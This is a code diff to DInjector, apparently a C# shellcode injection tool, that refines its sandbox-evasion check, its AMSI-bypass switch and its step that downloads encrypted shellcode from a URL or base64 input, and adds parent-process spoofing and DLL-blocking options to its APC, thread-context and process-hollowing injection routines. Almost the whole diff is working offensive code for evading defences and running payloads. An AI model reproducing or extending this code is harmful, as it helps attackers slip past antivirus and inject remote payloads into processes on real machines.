@@ -25,8 +25,7 @@ namespace DInjector
         static void Boom(string[] args)
         {
             // Check if we're in a sandbox by calling a rare-emulated API
-            IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-            if (mem == null)
+            if (VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
             {
                 Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                 return;
@@ -49,7 +48,7 @@ namespace DInjector
             // Bypass AMSI
             try
             {
-                if (string.Equals(options["/am51"], "true", StringComparison.OrdinalIgnoreCase))
+                if (bool.Parse(options["/am51"]))
                 {
                     AM51.Patch();
                 }
@@ -72,7 +71,7 @@ namespace DInjector
             byte[] shellcodeEncrypted;
             if (shellcodePath.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
             {
-                Console.WriteLine("(Detonator) [*] Loading sc from URL");
+                Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
                 WebClient wc = new WebClient();
                 ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                 MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
@@ -81,7 +80,7 @@ namespace DInjector
             }
             else
             {
-                Console.WriteLine("(Detonator) [*] Loading sc from Base64 input");
+                Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
                 shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
             }
 
@@ -112,17 +111,23 @@ namespace DInjector
                 case "remotethreadapc":
                     RemoteThreadAPC.Execute(
                         shellcodeBytes,
-                        options["/image"]);
+                        options["/image"],
+                        int.Parse(options["/ppid"]),
+                        bool.Parse(options["/blockDlls"]));
                     break;
                 case "remotethreadcontext":
                     RemoteThreadContext.Execute(
                         shellcodeBytes,
-                        options["/image"]);
+                        options["/image"],
+                        int.Parse(options["/ppid"]),
+                        bool.Parse(options["/blockDlls"]));
                     break;
                 case "processhollow":
                     ProcessHollow.Execute(
                         shellcodeBytes,
-                        options["/image"]);
+                        options["/image"],
+                        int.Parse(options["/ppid"]),
+                        bool.Parse(options["/blockDlls"]));
                     break;
             }
         }
